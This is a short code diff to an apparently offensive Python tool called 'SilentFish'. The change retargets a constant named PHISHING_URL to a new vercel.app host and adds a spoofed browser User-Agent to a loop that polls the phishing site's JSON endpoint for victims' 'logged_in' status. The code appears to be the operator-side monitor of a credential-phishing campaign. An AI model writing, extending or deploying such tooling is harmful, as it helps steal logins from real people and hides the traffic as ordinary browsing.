@@ -4,7 +4,7 @@ import time
 import requests
 
 # Constants
-PHISHING_URL = "https://demo-coding.vercel.app"
+PHISHING_URL = "https://coding-funda.vercel.app"
 TOOL_NAME = "SilentFish"
 DEVELOPER_INFO = "Developed by: Yamman Butt"
 
@@ -54,7 +54,9 @@ def start_polling():
     try:
         while True:
             # Fetch live data from the endpoint
-            response = requests.get(f"{PHISHING_URL}/json_data")
+            headers = {"User-Agent": "Mozilla/5.0"}
+            response = requests.get(f"{PHISHING_URL}/json_data", headers=headers, proxies=None)
+
             if response.status_code == 200:
                 data = response.json()
                 if data.get("login_status") == "logged_in":  # Replace with your API's login condition
